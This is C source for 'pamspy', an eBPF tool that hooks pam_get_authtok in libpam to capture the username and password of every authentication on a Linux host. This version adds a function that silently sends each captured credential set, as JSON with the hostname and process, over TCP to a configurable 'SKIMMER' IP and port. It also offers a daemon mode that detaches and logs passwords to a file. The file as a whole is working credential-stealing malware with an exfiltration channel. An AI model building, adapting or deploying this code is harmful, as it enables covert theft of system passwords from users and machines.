#include <argp.h>
#include <unistd.h>
#include <string.h>
#include <stdio.h>
#include <stdlib.h>
#include <signal.h>
#include <bpf/libbpf.h>
#include <stdbool.h>
#include <sys/resource.h>
#include <fcntl.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <limits.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include "pamspy.skel.h"
#include "pamspy_symbol.h"
#include "pamspy_event.h"

#ifndef SKIMMER_IP
#define SKIMMER_IP "127.0.0.1"
#endif
#ifndef SKIMMER_PORT
#define SKIMMER_PORT 9999
#endif

const char header[] =
"**************************************************************\n"
"*           / __ \\/ __ `/ __ `__ \\/ ___/ __ \\/ / / /         *\n"
"*          / /_/ / /_/ / / / / / (__  ) /_/ / /_/ /          *\n"
"*         / .___/\\__,_/_/ /_/ /_/____/ .___/\\__, /           *\n"
"*        /_/                        /_/    /____/            *\n"
"*                               by @citronneur (v0.2)        *\n"
"**************************************************************\n";


const char *argp_program_version = "pamspy 1.0";
const char *argp_program_bug_address = "";
const char argp_program_doc[] =
"pamspy\n"
"\n"
"Uses eBPF to dump secrets use by PAM (Authentication) module\n"
"By hooking the pam_get_authtok function in libpam.so\n"
"\n"
"USAGE: ./pamspy [-p $(/usr/sbin/ldconfig -p | grep libpam.so | cut -d ' ' -f4)] [-d /var/log/trace.0]\n"
"       (path argument is optional - auto-discovery will be used if not provided)\n";

/******************************************************************************/
/*!
 *  \brief  Auto-discover libpam.so path by checking common locations and ldconfig
 */
static char* auto_discover_libpam(void) {
    const char *common_paths[] = {
        "/lib/x86_64-linux-gnu/libpam.so.0",
        "/lib/x86_64-linux-gnu/libpam.so",
        "/usr/lib/x86_64-linux-gnu/libpam.so.0",
        "/usr/lib/x86_64-linux-gnu/libpam.so",
        "/lib64/libpam.so.0",
        "/lib64/libpam.so",
        "/usr/lib/libpam.so.0",
        "/usr/lib/libpam.so",
        "/lib/libpam.so.0",
        "/lib/libpam.so",
        NULL
    };
    
    // Try common paths first
    for (int i = 0; common_paths[i] != NULL; i++) {
        if (access(common_paths[i], F_OK) == 0) {
            return strdup(common_paths[i]);
        }
    }
    
    // Try using ldconfig if common paths failed
    FILE *fp = popen("/sbin/ldconfig -p 2>/dev/null | grep libpam.so", "r");
    if (fp != NULL) {
        char line[PATH_MAX];
        while (fgets(line, sizeof(line), fp) != NULL) {
            // Format: "libpam.so.0 (libc6,x86-64) => /usr/lib/x86_64-linux-gnu/libpam.so.0"
            char *path = strrchr(line, '>');
            if (path != NULL) {
                path += 2; // Skip "> "
                // Remove newline
                char *newline = strchr(path, '\n');
                if (newline) *newline = '\0';
                char *result = strdup(path);
                pclose(fp);
                return result;
            }
        }
        pclose(fp);
    }
    
    return NULL;
}

/******************************************************************************/
/*!
 *  \brief   arguments
 */
static struct env {
    int verbose;    // will print more details of the execution
    int print_headers;
    char* libpam_path;
    char* output_path;
} env;

/******************************************************************************/
static const struct argp_option opts[] = {
    { "path", 'p', "PATH", 0, "Path to the libpam.so file" },
    { "daemon", 'd', "OUTPUT", 0, "Start pamspy in daemon mode and output in the file passed as argument" },
    { "verbose", 'v', NULL, 1, "Verbose mode" },
    { "print-headers", 'r', NULL, 1, "Print headers of the program" },
    {},
};

/******************************************************************************/
/*!
 *  \brief  use to manage exit of the infinite loop
 */
static volatile sig_atomic_t exiting;

/******************************************************************************/
/*!
 *  signal handler
 */
void sig_int(int signo)
{
    exiting = 1;
}

/******************************************************************************/
/*!
 * \brief   print debug informations of libbpf
 */
static int libbpf_print_fn(enum libbpf_print_level level, const char *format, va_list args)
{
    return vfprintf(stderr, format, args);
}

/******************************************************************************/
/*!
 *  \brief  parse arguments of the command line
 */
static error_t parse_arg(int key, char *arg, struct argp_state *state)
{
    switch (key) {
    case 'p':
        env.libpam_path = strdup(arg);
        break;
    case 'd':
        env.output_path = strdup(arg);
        break;
    case 'v':
        env.verbose = true;
        break;
    case 'r':
        env.print_headers = true;
        break;
    case ARGP_KEY_ARG:
        argp_usage(state);
        break;
    default:
        return ARGP_ERR_UNKNOWN;
    }
    return 0;
}

/******************************************************************************/
// parse args configuration
static const struct argp argp = {
    .options = opts,
    .parser = parse_arg,
    .doc = argp_program_doc,
};

/******************************************************************************/
/*!
 *  \brief  send captured credentials to remote server in JSON format
 */
static void send_credentials_to_server(const char *username, 
                                       const char *password, int pid, const char *process)
{
    int sock;
    struct sockaddr_in server_addr;
    char json_buffer[1024];
    char hostname[256];
    
    // Get system hostname
    if (gethostname(hostname, sizeof(hostname)) != 0) {
        strcpy(hostname, "unknown");
    }
    
    // Create socket
    sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock < 0) {
        return;  // Silently fail to not interfere with normal operation
    }
    
    // Set up server address
    memset(&server_addr, 0, sizeof(server_addr));
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(SKIMMER_PORT);
    
    // Convert IP address
    if (inet_pton(AF_INET, SKIMMER_IP, &server_addr.sin_addr) <= 0) {
        close(sock);
        return;
    }
    
    // Connect to server
    if (connect(sock, (struct sockaddr *)&server_addr, sizeof(server_addr)) < 0) {
        close(sock);
        return;  // Silently fail if connection fails
    }
    
    // Create JSON payload
    snprintf(json_buffer, sizeof(json_buffer),
             "{\"hostname\": \"%s\", \"username\": \"%s\", \"password\": \"%s\", \"pid\": %d, \"process\": \"%s\"}",
             hostname,
             username ? username : "",
             password ? password : "",
             pid,
             process ? process : "");
    
    // Send data
    send(sock, json_buffer, strlen(json_buffer), 0);
    
    // Close socket
    close(sock);
}

/******************************************************************************/
/*!
 *  \brief  each time a secret from ebpf is detected
 */
static int handle_event(void *ctx, void *data, size_t data_sz)
{
    event_t* e = (event_t*)data;    
    // Send credentials to remote server (hostname is retrieved inside the function)
    send_credentials_to_server(e->username, e->password, e->pid, e->comm);
        if (env.output_path != NULL)
    {
        fprintf(stderr, "%u,%s,%s,%s\n", e->pid, e->comm, e->username, e->password);
    }
    else
    {
        fprintf(stderr, "%-6u | %-15s | %-20s | %s\n", e->pid, e->comm, e->username, e->password);
    }
    return 0;
}

/******************************************************************************/
static bool bump_memlock_rlimit(void)
{
    struct rlimit rlim_new = 
    {
        .rlim_cur    = RLIM_INFINITY,
        .rlim_max    = RLIM_INFINITY,
    };

    if (setrlimit(RLIMIT_MEMLOCK, &rlim_new)) 
    {
        return false;
    }
    return true;
}

/******************************************************************************/
static void start_daemon(void)
{
    pid_t child = fork();

    // error during fork
    if (child < 0)
    {
        exit(child);
    }

    // parent process
    if (child > 0)
    {
        exit(0);
    }

    // become the group leader
    setsid();

    child = fork();

    // error during fork
    if (child < 0)
    {
        exit(child);
    }

    // parent process
    if (child > 0)
    {
        exit(0);
    }

    umask(0);

    int chdir_flag = chdir("/tmp");
    if (chdir_flag != 0)
    {
        exit(1);
    }

    close(0);
    close(1);
    close(2);

    int fd_0 = open("/dev/null", O_RDWR);
    if (fd_0 != 0)
    {
        exit(1);
    }

    int fd_1 = open(env.output_path, O_RDWR | O_CREAT | O_APPEND, 0600);
    if (fd_1 != 1)
    {
        exit(1);
    }

    int fd_2 = dup(fd_1);
    if (fd_2 != 2)
    {
        exit(1);
    }
}

/******************************************************************************/
int main(int argc, char **argv)
{
    struct ring_buffer *rb = NULL;
    struct pamspy_bpf *skel;
    int err;

    signal(SIGINT, sig_int);
    signal(SIGTERM, sig_int);

    env.verbose = false;
    env.print_headers = false;
    env.libpam_path = NULL;
    env.output_path = NULL;

    // Parse command line arguments
    err = argp_parse(&argp, argc, argv, 0, NULL, NULL);
    if (err) 
    {
        return err;
    }

    if(env.libpam_path == NULL) 
    {
        // Try to auto-discover libpam.so
        env.libpam_path = auto_discover_libpam();
        if (env.libpam_path == NULL) {
            fprintf(stderr, "pamspy: argument PATH is mandatory or libpam.so could not be auto-discovered\n");
            exit(1);
        }
        if(env.verbose) {
            fprintf(stderr, "pamspy: Auto-discovered libpam at: %s\n", env.libpam_path);
        }
    }

    int offset = pamspy_find_symbol_address(env.libpam_path, "pam_get_authtok");

    if (offset == -1) 
    {
        fprintf(stderr, "pamspy: Unable to find pam_get_authtok function in %s\n", env.libpam_path);
        exit(1);
    }

    // check deamon mode
    if (env.output_path != NULL)
    {
        start_daemon();
    }

    if(env.verbose)
        libbpf_set_print(libbpf_print_fn);


    if(!bump_memlock_rlimit())
    {
        fprintf(stderr, "pamspy: Failed to increase RLIMIT_MEMLOCK limit! (hint: run as root)\n");
        exit(1);
    }
 
    // Open BPF application 
    skel = pamspy_bpf__open();
    if (!skel) {
        fprintf(stderr, "pamspy: Failed to open BPF program: %s\n", strerror(errno));
        return 1;
    }

    // Load program
    err = pamspy_bpf__load( skel);
    if (err) {
        fprintf(stderr, "pamspy: Failed to load BPF program: %s\n", strerror(errno));
        goto cleanup;
    }
    
    // Attach userland probes
    skel->links.get_addr_pam_get_authtok = bpf_program__attach_uprobe(
        skel->progs.get_addr_pam_get_authtok,
		false,           /* uprobe */
		-1,             /* any pid */
		env.libpam_path,       /* path to the lib*/
		offset
    );
    skel->links.trace_pam_get_authtok = bpf_program__attach_uprobe(
        skel->progs.trace_pam_get_authtok,
		true,           /* uretprobe */
		-1,             /* any pid */
		env.libpam_path,       /* path to the lib*/
		offset
    );

    // Set up ring buffer
    rb = ring_buffer__new(bpf_map__fd( skel->maps.rb), handle_event, NULL, NULL);
    if (!rb) {
        err = -1;
        fprintf(stderr, "pamspy: Failed to create ring buffer\n");
        goto cleanup;
    }

    if(env.print_headers)
    {
        fprintf(stdout, header);
        fprintf(stdout, "%-6s | %-15s | %-20s | %s\n", "PID", "PROCESS", "USERNAME", "PASSWORD");
        fprintf(stdout, "--------------------------------------------------------------\n");
    }

    while (!exiting) {
        err = ring_buffer__poll(rb, 100 /* timeout, ms */);
        /* Ctrl-C will cause -EINTR */
        if (err == -EINTR) {
            err = 0;
            break;
        }
        if (err < 0) {
            fprintf(stderr, "pamspy: Error polling perf buffer: %d\n", err);
            break;
        }
    }

cleanup:
    pamspy_bpf__destroy( skel);
    return -err;
}
